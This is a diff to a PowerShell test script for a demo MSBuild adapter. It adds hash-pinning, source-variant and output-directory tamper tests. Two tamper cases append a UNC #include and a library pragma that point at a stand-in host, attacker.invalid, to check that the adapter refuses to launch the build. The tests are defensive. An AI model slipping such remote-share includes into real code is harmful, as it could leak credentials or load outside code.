@@ -1,3 +1,6 @@
+[CmdletBinding()]
+param([switch]$StaticOnly)
+
 $ErrorActionPreference = 'Stop'
 
 $demoAdapterStandalone = $null -eq (Get-Command Assert-True -ErrorAction SilentlyContinue)
@@ -347,6 +350,28 @@ function Clear-DemoAdapterTrace {
     [System.IO.File]::WriteAllText($Path, '', (New-Object System.Text.UTF8Encoding($false)))
 }
 
+function Set-DemoAdapterKnownSourceVariant {
+    param([string]$Path, [ValidateSet('threshold3-error', 'threshold3-fixed')][string]$Variant)
+    $encoding = [System.Text.Encoding]::GetEncoding(932, (New-Object System.Text.EncoderExceptionFallback), (New-Object System.Text.DecoderExceptionFallback))
+    $text = $encoding.GetString([System.IO.File]::ReadAllBytes($Path))
+    $text = $text.Replace('if (consecutiveOverruns_ >= 1U) {', 'if (consecutiveOverruns_ >= 3U) {')
+    if ($Variant -eq 'threshold3-fixed') {
+        $faultLine = '#error MSBUILD_DEMO_ADAPTER_INTENTIONAL_COMPILER_FAULT "demo/CycleWatch/src/CycleWatch.cpp" AFTER_EVIDENCE_REPLACE_THIS_EXACT_LINE_WITH: #pragma message("MSBUILD_DEMO_ADAPTER_INTENTIONAL_FAULT_REPAIRED demo/CycleWatch/src/CycleWatch.cpp")'
+        $fixedLine = '#pragma message("MSBUILD_DEMO_ADAPTER_INTENTIONAL_FAULT_REPAIRED demo/CycleWatch/src/CycleWatch.cpp")'
+        $text = $text.Replace($faultLine, $fixedLine)
+    }
+    [System.IO.File]::WriteAllBytes($Path, $encoding.GetBytes($text))
+}
+
+function Set-DemoAdapterKnownLinkerTestsVariant {
+    param([string]$Path)
+    $encoding = [System.Text.Encoding]::GetEncoding(932, (New-Object System.Text.EncoderExceptionFallback), (New-Object System.Text.DecoderExceptionFallback))
+    $text = $encoding.GetString([System.IO.File]::ReadAllBytes($Path))
+    $needle = 'int main() {'
+    $replacement = 'extern "C" void TEAM_BOB_DEMO_MISSING_LINK_SYMBOL();' + "`r`n`r`n" + $needle + "`r`n    TEAM_BOB_DEMO_MISSING_LINK_SYMBOL();"
+    [System.IO.File]::WriteAllBytes($Path, $encoding.GetBytes($text.Replace($needle, $replacement)))
+}
+
 function Assert-DemoAdapterEnvironmentFailure {
     param([object]$Result, [string]$Reason, [string]$Message)
     Assert-Equal $Result.ExitCode 20 "$Message returns adapter environment exit 20"
@@ -360,6 +385,36 @@ $demoAdapterRepoRoot = Split-Path -Parent $PSScriptRoot
 $adapterSourcePath = Assert-DemoAdapterRequiredFile $demoAdapterRepoRoot 'demo/adapter/DemoMsdevAdapter.cs'
 $adapterBuildPath = Assert-DemoAdapterRequiredFile $demoAdapterRepoRoot 'demo/tools/Build-DemoMsdevAdapter.ps1'
 $adapterQualificationPath = Assert-DemoAdapterRequiredFile $demoAdapterRepoRoot 'demo/tools/Invoke-DemoAdapterQualification.ps1'
+
+$adapterSourceContract = [System.IO.File]::ReadAllText($adapterSourcePath)
+$adapterBuildContract = [System.IO.File]::ReadAllText($adapterBuildPath)
+$adapterQualificationContract = [System.IO.File]::ReadAllText($adapterQualificationPath)
+foreach ($requiredConfigurationField in @(
+    'CycleWatchHeaderSha256', 'CycleWatchTestsSha256', 'CycleWatchTestsLinkerProbeSha256',
+    'CycleWatchSourceBaselineSha256', 'CycleWatchSourceThreshold3ErrorSha256', 'CycleWatchSourceThreshold3FixedSha256'
+)) {
+    Assert-True ($adapterSourceContract.Contains('DemoAdapterConfiguration.' + $requiredConfigurationField)) "Adapter consumes fixed compiler-input field '$requiredConfigurationField'"
+    Assert-True ($adapterBuildContract.Contains($requiredConfigurationField)) "Build configuration emits fixed compiler-input field '$requiredConfigurationField'"
+    $qualificationField = $requiredConfigurationField.Substring(0, 1).ToLowerInvariant() + $requiredConfigurationField.Substring(1)
+    Assert-True ($adapterQualificationContract.Contains($qualificationField)) "Qualification manifest validates fixed compiler-input field '$qualificationField'"
+}
+foreach ($requiredEvidenceField in @('cycleWatchSourceSha256', 'cycleWatchSourceVariant', 'cycleWatchHeaderSha256', 'cycleWatchTestsSha256')) {
+    Assert-True ($adapterSourceContract.Contains('"' + $requiredEvidenceField + '"')) "Adapter evidence emits observed compiler-input field '$requiredEvidenceField'"
+    Assert-True ($adapterQualificationContract.Contains("'$requiredEvidenceField'")) "Qualification validates observed compiler-input field '$requiredEvidenceField'"
+}
+foreach ($requiredFailure in @('OUTPUT_BIN_EXISTS', 'OUTPUT_OBJ_EXISTS', 'SOURCE_HASH', 'HEADER_HASH', 'TESTS_HASH')) {
+    Assert-True ($adapterSourceContract.Contains('"' + $requiredFailure + '"')) "Adapter has stable failure '$requiredFailure'"
+}
+Assert-True ($adapterSourceContract.Contains('PrepareOwnedOutputDirectories')) 'Adapter owns empty bin/Release and obj/Release directories before launch'
+Assert-True ($adapterSourceContract.Contains('ValidateOwnedOutputDirectories')) 'Adapter revalidates owned output directories around native execution'
+Assert-True ($adapterSourceContract.Contains('ValidateCompilerInputs')) 'Adapter validates every compiled input before launch'
+Assert-True ($adapterBuildContract.Contains('MSBUILD_DEMO_ADAPTER_INTENTIONAL_FAULT_REPAIRED')) 'Build derives the exact repaired source variant from distribution baseline'
+Assert-True ($adapterBuildContract.Contains('TEAM_BOB_DEMO_MISSING_LINK_SYMBOL')) 'Build derives the exact qualification linker-probe variant from distribution baseline'
+
+if ($StaticOnly) {
+    Write-Host "PASS: $script:Assertions static demo adapter contract assertions succeeded."
+    exit 0
+}
 
 $profileFingerprintBefore = Get-DemoAdapterTreeFingerprint (Join-Path $demoAdapterRepoRoot 'profile')
 $demoSourceFingerprintBefore = Get-DemoAdapterTreeFingerprint (Join-Path $demoAdapterRepoRoot 'demo\CycleWatch')
@@ -414,6 +469,8 @@ try {
         'schemaVersion', 'banner', 'adapterSourceRelativePath', 'adapterSourceSha256', 'generatedConfigurationSha256',
         'msBuildPath', 'msBuildSha256', 'cscPath', 'cscSha256', 'distributionRoot', 'sandboxRoot', 'logRoot',
         'projectRelativePath', 'projectSha256', 'vcxProjectSha256', 'target', 'expectedArtifactRelativePath',
+        'cycleWatchHeaderSha256', 'cycleWatchTestsSha256', 'cycleWatchTestsLinkerProbeSha256',
+        'cycleWatchSourceBaselineSha256', 'cycleWatchSourceThreshold3ErrorSha256', 'cycleWatchSourceThreshold3FixedSha256',
         'outputFileName', 'outputSha256'
     )
     Assert-DemoAdapterPropertySet $manifest $manifestFields 'Build manifest has a closed field set'
@@ -428,6 +485,12 @@ try {
     Assert-Equal $manifest.cscSha256 (Get-DemoAdapterHash $fakeTools.CscPath) 'Manifest records compiler hash'
     Assert-Equal $manifest.projectRelativePath 'demo/CycleWatch/CycleWatch.dsp' 'Manifest fixes the project tail'
     Assert-Equal $manifest.expectedArtifactRelativePath 'demo/CycleWatch/bin/Release/CycleWatchTests.exe' 'Manifest fixes expected artifact tail'
+    Assert-Equal $manifest.cycleWatchHeaderSha256 (Get-DemoAdapterHash (Join-Path $distributionRoot 'demo\CycleWatch\include\CycleWatch.h')) 'Manifest fixes the compiled header baseline'
+    Assert-Equal $manifest.cycleWatchTestsSha256 (Get-DemoAdapterHash (Join-Path $distributionRoot 'demo\CycleWatch\tests\CycleWatchTests.cpp')) 'Manifest fixes the compiled tests baseline'
+    Assert-Equal $manifest.cycleWatchSourceBaselineSha256 (Get-DemoAdapterHash (Join-Path $distributionRoot 'demo\CycleWatch\src\CycleWatch.cpp')) 'Manifest fixes the compiled source baseline'
+    foreach ($compilerInputHash in @(
+        $manifest.cycleWatchTestsLinkerProbeSha256, $manifest.cycleWatchSourceThreshold3ErrorSha256, $manifest.cycleWatchSourceThreshold3FixedSha256
+    )) { Assert-True ([string]$compilerInputHash -match '^[0-9a-f]{64}$') 'Manifest derived compiler-input variants have canonical SHA-256 values' }
     Assert-Equal $manifest.outputFileName 'DemoMsdevAdapter.exe' 'Manifest fixes output name'
     Assert-Equal $manifest.outputSha256 (Get-DemoAdapterHash $adapterPath) 'Manifest records adapter output hash'
     Assert-Equal (@(Get-ChildItem -LiteralPath $buildTempRoot -Force).Count) 0 'Build removes generated config and compiler intermediates'
@@ -572,6 +635,7 @@ try {
         'schemaVersion', 'banner', 'taskId', 'invocationId', 'action', 'attempt', 'faultInjected',
         'adapterSha256', 'msBuildPath', 'msBuildSha256', 'sandboxRoot', 'logRoot', 'projectRelativePath',
         'projectSha256', 'vcxProjectSha256', 'target', 'expectedArtifactRelativePath', 'expectedArtifactSha256',
+        'cycleWatchSourceSha256', 'cycleWatchSourceVariant', 'cycleWatchHeaderSha256', 'cycleWatchTestsSha256',
         'nativeExitCode', 'startedAt', 'finishedAt', 'status', 'environmentError'
     )
     $compileEvidence = Get-DemoAdapterUtf8Text $compileCase.EvidencePath | ConvertFrom-Json
@@ -586,6 +650,10 @@ try {
     Assert-Equal $compileEvidence.msBuildSha256 (Get-DemoAdapterHash $fakeTools.MsBuildPath) 'Evidence records rechecked MSBuild hash'
     Assert-Equal $compileEvidence.projectSha256 $manifest.projectSha256 'Evidence records DSP hash'
     Assert-Equal $compileEvidence.vcxProjectSha256 $manifest.vcxProjectSha256 'Evidence records VCX hash'
+    Assert-Equal $compileEvidence.cycleWatchSourceSha256 $manifest.cycleWatchSourceBaselineSha256 'Evidence records observed baseline source hash'
+    Assert-Equal $compileEvidence.cycleWatchSourceVariant 'baseline-error' 'Evidence names the observed source variant'
+    Assert-Equal $compileEvidence.cycleWatchHeaderSha256 $manifest.cycleWatchHeaderSha256 'Evidence records observed header hash'
+    Assert-Equal $compileEvidence.cycleWatchTestsSha256 $manifest.cycleWatchTestsSha256 'Evidence records observed tests hash'
     Assert-Equal $compileEvidence.nativeExitCode 1 'Evidence records native exit'
     Assert-Equal $compileEvidence.status 'FAILED' 'Evidence records native failure status'
     Assert-True ($null -eq $compileEvidence.expectedArtifactSha256 -and $null -eq $compileEvidence.environmentError) 'Native failure invents no artifact or environment error'
@@ -599,6 +667,8 @@ try {
     Assert-Equal $makeTrace.Count 1 'Attempt 1 Make launches one MSBuild process'
     Assert-True ($null -eq $makeTrace[0].CL -and $null -eq $makeTrace[0].UnderCl -and $null -eq $makeTrace[0].Link -and $null -eq $makeTrace[0].UnderLink) 'Attempt 1 Make clears all inherited tool injection variables'
     Assert-True (Test-Path -LiteralPath $makeCase.ArtifactPath -PathType Leaf) 'Successful Make produces exact artifact'
+    Assert-True (Test-Path -LiteralPath (Join-Path $makeCase.ProjectDirectory 'bin\Release') -PathType Container) 'Adapter owns the fixed bin/Release directory'
+    Assert-True (Test-Path -LiteralPath (Join-Path $makeCase.ProjectDirectory 'obj\Release') -PathType Container) 'Adapter owns the fixed obj/Release directory'
     $makeLog = Get-DemoAdapterCp932Text $makeCase.LogPath
     Assert-True ($makeLog.Contains("TEAM_BOB_ADAPTER_STATUS=SUCCEEDED`r`n")) 'Successful Make emits exact success marker'
     $localizedNativeMarker = 'FAKE_MSBUILD_LOCALIZED_SUCCESS_' + [char]0x65e5 + [char]0x672c + [char]0x8a9e
@@ -626,6 +696,17 @@ try {
     Assert-Equal $attemptTwo.ExitCode 0 'Attempt 2 Make succeeds'
     $attemptTwoTrace = @(Read-DemoAdapterTrace $tracePath)
     Assert-True ($null -eq $attemptTwoTrace[0].CL) 'Attempt 2 Make never injects compiler fault'
+
+    foreach ($knownSourceVariant in @('threshold3-error', 'threshold3-fixed')) {
+        $knownSourceCase = New-DemoAdapterInvocation $distributionRoot $sandboxRoot $logRoot ('ADAPTER-SOURCE-' + $knownSourceVariant.ToUpperInvariant()) 1 'make'
+        Set-DemoAdapterKnownSourceVariant (Join-Path $knownSourceCase.ProjectDirectory 'src\CycleWatch.cpp') $knownSourceVariant
+        Clear-DemoAdapterTrace $tracePath
+        $knownSourceResult = Invoke-DemoAdapterExecutable $adapterPath @($knownSourceCase.ProjectPath, '/MAKE', 'CycleWatch - Win32 Release', '/OUT', $knownSourceCase.LogPath)
+        Assert-Equal $knownSourceResult.ExitCode 0 "Known source variant '$knownSourceVariant' is accepted"
+        Assert-Equal (@(Read-DemoAdapterTrace $tracePath).Count) 1 "Known source variant '$knownSourceVariant' launches exactly once"
+        $knownSourceEvidence = Get-DemoAdapterUtf8Text $knownSourceCase.EvidencePath | ConvertFrom-Json
+        Assert-Equal $knownSourceEvidence.cycleWatchSourceVariant $knownSourceVariant "Evidence identifies known source variant '$knownSourceVariant'"
+    }
 
     $missingCase = New-DemoAdapterInvocation $distributionRoot $sandboxRoot $logRoot 'ADAPTER-MISSING' 1 'make' '44444444444444444444444444444444'
     $env:TEAM_BOB_FAKE_MSBUILD_MODE = 'missing-artifact'
@@ -660,7 +741,7 @@ try {
     [System.IO.File]::WriteAllText($staleCase.ArtifactPath, 'stale')
     Clear-DemoAdapterTrace $tracePath
     $stale = Invoke-DemoAdapterExecutable $adapterPath @($staleCase.ProjectPath, '/MAKE', 'CycleWatch - Win32 Release', '/OUT', $staleCase.LogPath)
-    Assert-DemoAdapterEnvironmentFailure $stale 'STALE_ARTIFACT' 'Stale expected artifact'
+    Assert-DemoAdapterEnvironmentFailure $stale 'OUTPUT_BIN_EXISTS' 'Stale expected artifact inside a preexisting bin tree'
     Assert-Equal (@(Read-DemoAdapterTrace $tracePath).Count) 0 'Stale artifact is rejected before launch'
 
     $nativeCase = New-DemoAdapterInvocation $distributionRoot $sandboxRoot $logRoot 'ADAPTER-NATIVE' 1 'make' '66666666666666666666666666666666'
@@ -693,6 +774,63 @@ try {
     $vcxFailure = Invoke-DemoAdapterExecutable $adapterPath @($vcxCase.ProjectPath, '/MAKE', 'CycleWatch - Win32 Release', '/OUT', $vcxCase.LogPath)
     Assert-DemoAdapterEnvironmentFailure $vcxFailure 'VCXPROJECT_HASH' 'VCX hash tamper'
     Assert-Equal (@(Read-DemoAdapterTrace $tracePath).Count) 0 'VCX tamper launches nothing'
+
+    foreach ($inputTamper in @(
+        [pscustomobject]@{ Name = 'UNC include'; RelativePath = 'src\CycleWatch.cpp'; Reason = 'SOURCE_HASH'; Text = "`r`n#include `"\\\\attacker.invalid\\share\\probe.h`"`r`n" },
+        [pscustomobject]@{ Name = 'MSVC pragma library'; RelativePath = 'src\CycleWatch.cpp'; Reason = 'SOURCE_HASH'; Text = "`r`n__pragma(comment(lib, `"\\\\attacker.invalid\\share\\probe.lib`"))`r`n" },
+        [pscustomobject]@{ Name = 'extra source edit'; RelativePath = 'src\CycleWatch.cpp'; Reason = 'SOURCE_HASH'; Text = "`r`n// unapproved extra edit`r`n" },
+        [pscustomobject]@{ Name = 'header edit'; RelativePath = 'include\CycleWatch.h'; Reason = 'HEADER_HASH'; Text = "`r`n// unapproved header edit`r`n" },
+        [pscustomobject]@{ Name = 'tests edit'; RelativePath = 'tests\CycleWatchTests.cpp'; Reason = 'TESTS_HASH'; Text = "`r`n// unapproved tests edit`r`n" }
+    )) {
+        $inputCase = New-DemoAdapterInvocation $distributionRoot $sandboxRoot $logRoot ('ADAPTER-INPUT-' + ($inputTamper.Name -replace '[^A-Za-z]', '-').ToUpperInvariant()) 1 'make'
+        [System.IO.File]::AppendAllText((Join-Path $inputCase.ProjectDirectory $inputTamper.RelativePath), $inputTamper.Text, [System.Text.Encoding]::GetEncoding(932))
+        Clear-DemoAdapterTrace $tracePath
+        $inputFailure = Invoke-DemoAdapterExecutable $adapterPath @($inputCase.ProjectPath, '/MAKE', 'CycleWatch - Win32 Release', '/OUT', $inputCase.LogPath)
+        Assert-DemoAdapterEnvironmentFailure $inputFailure $inputTamper.Reason $inputTamper.Name
+        Assert-Equal (@(Read-DemoAdapterTrace $tracePath).Count) 0 "$($inputTamper.Name) launches nothing"
+    }
+
+    $misScopedLinkerCase = New-DemoAdapterInvocation $distributionRoot $sandboxRoot $logRoot 'ADAPTER-LINKER-VARIANT-SCOPE' 1 'make'
+    Set-DemoAdapterKnownLinkerTestsVariant (Join-Path $misScopedLinkerCase.ProjectDirectory 'tests\CycleWatchTests.cpp')
+    Clear-DemoAdapterTrace $tracePath
+    $misScopedLinkerFailure = Invoke-DemoAdapterExecutable $adapterPath @($misScopedLinkerCase.ProjectPath, '/MAKE', 'CycleWatch - Win32 Release', '/OUT', $misScopedLinkerCase.LogPath)
+    Assert-DemoAdapterEnvironmentFailure $misScopedLinkerFailure 'TESTS_HASH' 'Qualification linker tests variant outside its fixed invocation'
+    Assert-Equal (@(Read-DemoAdapterTrace $tracePath).Count) 0 'Mis-scoped linker tests variant launches nothing'
+
+    foreach ($outputBlocker in @(
+        [pscustomobject]@{ Name = 'bin file'; RelativePath = 'bin'; Reason = 'OUTPUT_BIN_EXISTS'; Kind = 'File' },
+        [pscustomobject]@{ Name = 'obj file'; RelativePath = 'obj'; Reason = 'OUTPUT_OBJ_EXISTS'; Kind = 'File' },
+        [pscustomobject]@{ Name = 'bin directory'; RelativePath = 'bin'; Reason = 'OUTPUT_BIN_EXISTS'; Kind = 'Directory' },
+        [pscustomobject]@{ Name = 'obj directory'; RelativePath = 'obj'; Reason = 'OUTPUT_OBJ_EXISTS'; Kind = 'Directory' }
+    )) {
+        $outputCase = New-DemoAdapterInvocation $distributionRoot $sandboxRoot $logRoot ('ADAPTER-OUTPUT-' + ($outputBlocker.Name -replace '[^A-Za-z]', '-').ToUpperInvariant()) 1 'make'
+        $blockerPath = Join-Path $outputCase.ProjectDirectory $outputBlocker.RelativePath
+        if ($outputBlocker.Kind -eq 'File') { [System.IO.File]::WriteAllText($blockerPath, 'foreign output blocker') }
+        else { [void][System.IO.Directory]::CreateDirectory($blockerPath) }
+        Clear-DemoAdapterTrace $tracePath
+        $outputFailure = Invoke-DemoAdapterExecutable $adapterPath @($outputCase.ProjectPath, '/MAKE', 'CycleWatch - Win32 Release', '/OUT', $outputCase.LogPath)
+        Assert-DemoAdapterEnvironmentFailure $outputFailure $outputBlocker.Reason $outputBlocker.Name
+        Assert-Equal (@(Read-DemoAdapterTrace $tracePath).Count) 0 "$($outputBlocker.Name) launches nothing"
+    }
+
+    foreach ($junctionName in @('bin', 'obj')) {
+        $outputJunctionCase = New-DemoAdapterInvocation $distributionRoot $sandboxRoot $logRoot ('ADAPTER-OUTPUT-' + $junctionName.ToUpperInvariant() + '-JUNCTION') 1 'make'
+        $outputJunctionTarget = Join-Path $demoAdapterFixtureFull ('foreign-' + $junctionName + '-target')
+        [void][System.IO.Directory]::CreateDirectory($outputJunctionTarget)
+        $outputJunctionCreated = $false
+        try {
+            [void](New-Item -ItemType Junction -Path (Join-Path $outputJunctionCase.ProjectDirectory $junctionName) -Target $outputJunctionTarget -ErrorAction Stop)
+            $outputJunctionCreated = $true
+        } catch { $outputJunctionCreated = $false }
+        if ($outputJunctionCreated) {
+            Clear-DemoAdapterTrace $tracePath
+            $outputJunctionFailure = Invoke-DemoAdapterExecutable $adapterPath @($outputJunctionCase.ProjectPath, '/MAKE', 'CycleWatch - Win32 Release', '/OUT', $outputJunctionCase.LogPath)
+            $junctionReason = if ($junctionName -eq 'bin') { 'OUTPUT_BIN_EXISTS' } else { 'OUTPUT_OBJ_EXISTS' }
+            Assert-DemoAdapterEnvironmentFailure $outputJunctionFailure $junctionReason "Preexisting $junctionName junction"
+            Assert-Equal (@(Read-DemoAdapterTrace $tracePath).Count) 0 "Preexisting $junctionName junction launches nothing"
+            Assert-Equal (@(Get-ChildItem -LiteralPath $outputJunctionTarget -Force).Count) 0 "Rejected $junctionName junction receives no native output"
+        } else { Write-Host "INFO: $junctionName output junction creation unavailable; output reparse probe skipped." }
+    }
 
     $validationCase = New-DemoAdapterInvocation $distributionRoot $sandboxRoot $logRoot 'ADAPTER-VALIDATE' 1 'make' 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
     $invalidCases = @(
@@ -801,6 +939,8 @@ try {
         'schemaVersion', 'banner', 'recordType', 'qualificationEligible', 'approved', 'vc6Qualified', 'pcId',
         'visualStudio', 'adapterPath', 'buildManifestPath', 'adapterSha256', 'msBuildPath', 'msBuildSha256',
         'projectSha256', 'vcxProjectSha256', 'sandboxRoot', 'logRoot', 'evidenceRoot',
+        'cycleWatchHeaderSha256', 'cycleWatchTestsSha256', 'cycleWatchTestsLinkerProbeSha256',
+        'cycleWatchSourceBaselineSha256', 'cycleWatchSourceThreshold3ErrorSha256', 'cycleWatchSourceThreshold3FixedSha256',
         'startedAt', 'finishedAt', 'passed', 'probes'
     )
     Assert-DemoAdapterPropertySet $qualificationRecord $qualificationFields 'Qualification record has closed top-level schema'
@@ -817,6 +957,10 @@ try {
     Assert-Equal $qualificationRecord.msBuildSha256 (Get-DemoAdapterHash $fakeTools.MsBuildPath) 'Qualification record hashes MSBuild'
     Assert-Equal $qualificationRecord.projectSha256 $manifest.projectSha256 'Qualification record fixes DSP hash'
     Assert-Equal $qualificationRecord.vcxProjectSha256 $manifest.vcxProjectSha256 'Qualification record fixes VCX hash'
+    foreach ($compilerInputField in @(
+        'cycleWatchHeaderSha256', 'cycleWatchTestsSha256', 'cycleWatchTestsLinkerProbeSha256',
+        'cycleWatchSourceBaselineSha256', 'cycleWatchSourceThreshold3ErrorSha256', 'cycleWatchSourceThreshold3FixedSha256'
+    )) { Assert-Equal $qualificationRecord.$compilerInputField $manifest.$compilerInputField "Qualification record fixes compiler-input field '$compilerInputField'" }
     Assert-Equal $qualificationRecord.passed $true 'All deterministic raw probes pass'
     $probeIds = @($qualificationRecord.probes | ForEach-Object { $_.id })
     $expectedProbeIds = @('help', 'msbuild-hash', 'normal-make', 'normal-rebuild', 'compiler-failure', 'linker-failure', 'artifact-presence', 'invalid-target-no-launch', 'invalid-input-no-launch')
